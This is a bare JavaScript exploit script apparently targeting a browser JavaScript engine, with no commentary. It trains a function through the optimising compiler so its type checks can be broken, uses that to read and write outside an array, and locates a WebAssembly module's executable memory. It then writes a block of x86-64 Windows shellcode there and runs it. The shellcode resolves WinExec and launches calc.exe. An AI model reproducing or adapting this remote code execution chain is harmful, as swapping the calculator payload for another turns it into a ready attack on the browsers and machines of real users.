let o={y1:1.1,y2:1.2};
let buf =new ArrayBuffer(16);
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}



function hex(i)
{
    return i.toString(16).padStart(16, "0");
}
function print(i){
console.log(i);}


function test() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

get_pwnd = test();



let o1={x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9};
let arr = [1.1, 2.2];
function opt(arr, obj){
  arr.a; 
  var c = obj & 0xff;  
 arr.d=0x2000;
arr.y=0x2000;
}
var obj = {valueOf:function(){return 2;}}

opt(o1, obj);
//%OptimizeFunctionOnNextCall(opt);
for(let i=0;i<10000;i++){
opt(o1, obj);
}
let o2 = {x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9};
let o3=[1.1,1.2];
const ab = new ArrayBuffer(0x1234);
const sig = {a:0xdead,b:0xbeef,c:get_pwnd};

var obj = {valueOf:function(){
o2.__defineGetter__('xx',()=>2);
o2.__defineGetter__('xx',()=>2);
for (var i = 0; i < 0x10; i++)
		new ArrayBuffer(0x1000000);
return 2;}};


print(opt(o2, obj));


let waddr=d2u(o3[19])-0x171;
print(hex(d2u(waddr)));



o3[10]=u2d(waddr);
let dv=new DataView(ab);


she=dv.getFloat64(0,true);
print(hex(d2u(she)));
o3[10]=she;
var shellcode = [
0x65, 0x48, 0x8B, 0x24, 0x25, 0x30, 0x00, 0x00, 0x00,0x48, 0x81, 0xC4, 0x00, 0x60, 0x00, 0x00, 0xE8, 0x77, 0x03, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 
	0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x68, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x89, 
	0x44, 0x24, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 
	0x24, 0x28, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x4C, 0x24, 0x10, 0x48, 0x03, 0xC8, 0x48, 0x8B, 
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x83, 0xC0, 0x18, 0x48, 
	0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 
	0x24, 0x38, 0x48, 0x8D, 0x44, 0x01, 0x70, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 
	0x40, 0x8B, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x10, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 
	0x44, 0x24, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x4C, 0x24, 0x10, 
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x44, 0x24, 0x18, 
	0x8B, 0x40, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x10, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 
	0x44, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x8B, 0x40, 0x24, 0x48, 0x8B, 0x4C, 0x24, 0x10, 
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0xC7, 0x44, 0x24, 0x20, 
	0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 
	0x24, 0x08, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x08, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x8B, 0x40, 0x18, 
	0x39, 0x44, 0x24, 0x08, 0x0F, 0x83, 0x9D, 0x01, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x08, 0x48, 0x8B, 
	0x4C, 0x24, 0x48, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x4C, 0x24, 0x70, 0x48, 0x03, 0xC8, 0x48, 0x8B, 
	0xC1, 0x48, 0x89, 0x04, 0x24, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 
	0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x47, 0x0F, 0x85, 0x63, 0x01, 0x00, 0x00, 0xB8, 
	0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x01, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 
	0x83, 0xF8, 0x65, 0x0F, 0x85, 0x49, 0x01, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 
	0xC0, 0x02, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x74, 0x0F, 0x85, 0x2F, 
	0x01, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x03, 0x48, 0x8B, 0x0C, 0x24, 
	0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x50, 0x0F, 0x85, 0x15, 0x01, 0x00, 0x00, 0xB8, 0x01, 0x00, 
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x04, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 
	0x72, 0x0F, 0x85, 0xFB, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x05, 
	0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x6F, 0x0F, 0x85, 0xE1, 0x00, 0x00, 
	0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x06, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 
	0x04, 0x01, 0x83, 0xF8, 0x63, 0x0F, 0x85, 0xC7, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 
	0x48, 0x6B, 0xC0, 0x07, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x41, 0x0F, 
	0x85, 0xAD, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x08, 0x48, 0x8B, 
	0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x64, 0x0F, 0x85, 0x93, 0x00, 0x00, 0x00, 0xB8, 
	0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x09, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 
	0x83, 0xF8, 0x64, 0x75, 0x7D, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x0A, 0x48, 0x8B, 
	0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x72, 0x75, 0x67, 0xB8, 0x01, 0x00, 0x00, 0x00, 
	0x48, 0x6B, 0xC0, 0x0B, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x65, 0x75, 
	0x51, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x0C, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 
	0x04, 0x01, 0x83, 0xF8, 0x73, 0x75, 0x3B, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x0D, 
	0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x04, 0x01, 0x83, 0xF8, 0x73, 0x75, 0x25, 0x8B, 0x44, 0x24, 
	0x08, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x0F, 0xB7, 0x04, 0x41, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x8B, 
	0x04, 0x81, 0x48, 0x8B, 0x4C, 0x24, 0x70, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 
	0x24, 0x20, 0xE9, 0x47, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x68, 
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
	0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x48, 0xE8, 0x82, 0x01, 0x00, 0x00, 0x48, 0x89, 
	0x44, 0x24, 0x28, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xE8, 0x43, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 
	0x24, 0x50, 0x48, 0x89, 0x01, 0xC6, 0x44, 0x24, 0x30, 0x4C, 0xC6, 0x44, 0x24, 0x31, 0x6F, 0xC6, 
	0x44, 0x24, 0x32, 0x61, 0xC6, 0x44, 0x24, 0x33, 0x64, 0xC6, 0x44, 0x24, 0x34, 0x4C, 0xC6, 0x44, 
	0x24, 0x35, 0x69, 0xC6, 0x44, 0x24, 0x36, 0x62, 0xC6, 0x44, 0x24, 0x37, 0x72, 0xC6, 0x44, 0x24, 
	0x38, 0x61, 0xC6, 0x44, 0x24, 0x39, 0x72, 0xC6, 0x44, 0x24, 0x3A, 0x79, 0xC6, 0x44, 0x24, 0x3B, 
	0x41, 0xC6, 0x44, 0x24, 0x3C, 0x00, 0xC6, 0x44, 0x24, 0x20, 0x57, 0xC6, 0x44, 0x24, 0x21, 0x69, 
	0xC6, 0x44, 0x24, 0x22, 0x6E, 0xC6, 0x44, 0x24, 0x23, 0x45, 0xC6, 0x44, 0x24, 0x24, 0x78, 0xC6, 
	0x44, 0x24, 0x25, 0x65, 0xC6, 0x44, 0x24, 0x26, 0x63, 0xC6, 0x44, 0x24, 0x27, 0x00, 0x48, 0x8D, 
	0x54, 0x24, 0x30, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x50, 0xFF, 0x10, 0x48, 
	0x8B, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x41, 0x08, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x8B, 0x4C, 
	0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x50, 0xFF, 0x10, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x89, 
	0x81, 0x90, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
	0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xE8, 0x1F, 0xFF, 0xFF, 
	0xFF, 0xC6, 0x44, 0x24, 0x20, 0x43, 0xC6, 0x44, 0x24, 0x21, 0x3A, 0xC6, 0x44, 0x24, 0x22, 0x5C, 
	0xC6, 0x44, 0x24, 0x23, 0x57, 0xC6, 0x44, 0x24, 0x24, 0x69, 0xC6, 0x44, 0x24, 0x25, 0x6E, 0xC6, 
	0x44, 0x24, 0x26, 0x64, 0xC6, 0x44, 0x24, 0x27, 0x6F, 0xC6, 0x44, 0x24, 0x28, 0x77, 0xC6, 0x44, 
	0x24, 0x29, 0x73, 0xC6, 0x44, 0x24, 0x2A, 0x5C, 0xC6, 0x44, 0x24, 0x2B, 0x53, 0xC6, 0x44, 0x24, 
	0x2C, 0x79, 0xC6, 0x44, 0x24, 0x2D, 0x73, 0xC6, 0x44, 0x24, 0x2E, 0x74, 0xC6, 0x44, 0x24, 0x2F, 
	0x65, 0xC6, 0x44, 0x24, 0x30, 0x6D, 0xC6, 0x44, 0x24, 0x31, 0x33, 0xC6, 0x44, 0x24, 0x32, 0x32, 
	0xC6, 0x44, 0x24, 0x33, 0x5C, 0xC6, 0x44, 0x24, 0x34, 0x63, 0xC6, 0x44, 0x24, 0x35, 0x61, 0xC6, 
	0x44, 0x24, 0x36, 0x6C, 0xC6, 0x44, 0x24, 0x37, 0x63, 0xC6, 0x44, 0x24, 0x38, 0x2E, 0xC6, 0x44, 
	0x24, 0x39, 0x65, 0xC6, 0x44, 0x24, 0x3A, 0x78, 0xC6, 0x44, 0x24, 0x3B, 0x65, 0xC6, 0x44, 0x24, 
	0x3C, 0x00, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x94, 0x24, 0xD0, 
	0x00, 0x00, 0x00, 0x48, 0x81, 0xC4, 0xE8, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
	0x55, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 
	0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x40, 
	0x20, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5D, 0xC3
];
for (var i = 0; i < shellcode.length; i++)
{
	dv.setUint8(i , shellcode[i], true);
}


get_pwnd();
